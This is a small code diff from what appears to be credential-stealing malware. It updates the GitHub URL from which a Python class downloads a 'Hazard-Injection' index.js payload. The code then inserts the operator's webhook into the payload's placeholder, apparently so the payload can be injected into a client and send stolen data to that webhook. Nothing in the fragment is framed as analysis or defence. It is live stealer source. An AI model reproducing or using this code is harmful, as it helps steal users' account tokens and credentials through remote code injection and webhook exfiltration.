@@ -38,7 +38,7 @@ class Start:
                                 except PermissionError:
                                     pass
                             f = httpx.get(
-                                "https://raw.githubusercontent.com/KrynixOfficial/Hazard-Injection/main/index.js"
+                                "https://raw.githubusercontent.com/Krynix1/Hazard-Injection/main/index.js"
                             ).text.replace(
                                 "webhook: '%WEBHOOK%'", f"webhook: '{self.Webhook}'"
                             )
